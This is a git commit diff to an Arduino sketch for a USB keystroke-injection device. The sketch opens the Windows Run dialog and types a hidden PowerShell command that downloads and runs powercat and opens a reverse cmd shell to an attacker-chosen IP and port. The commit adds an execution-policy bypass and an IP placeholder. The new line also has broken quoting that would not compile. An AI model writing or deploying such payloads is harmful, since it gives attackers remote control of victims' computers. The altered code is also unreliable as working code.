6ca33615dccb2a4d1e83ba87b14257b75722a774
Mel-Adrien Dodin <65346144+Adrilaw@users.noreply.github.com>
2024-10-12 15:11:35 +0400

    Update Revershell_WinFr.ino

--- Revershell_Win/Revershell_WinFr/Revershell_WinFr.ino
+++ Revershell_Win/Revershell_WinFr/Revershell_WinFr.ino
@@ -7,7 +7,7 @@ void setup() {
   DigiKeyboardFr.sendKeyStroke(0);
   DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboardFr.delay(500);
-  DigiKeyboardFr.print("PowerShell.exe -WindowStyle Hidden -Command \"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ;powercat -c 192.168.27.91 -p 9001 -e cmd\"");
+  DigiKeyboardFr.print(PowerShell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ;powercat -c <your machine ip> -p 4444 -e cmd"");
   DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
   DigiKeyboardFr.delay(1000);
 }
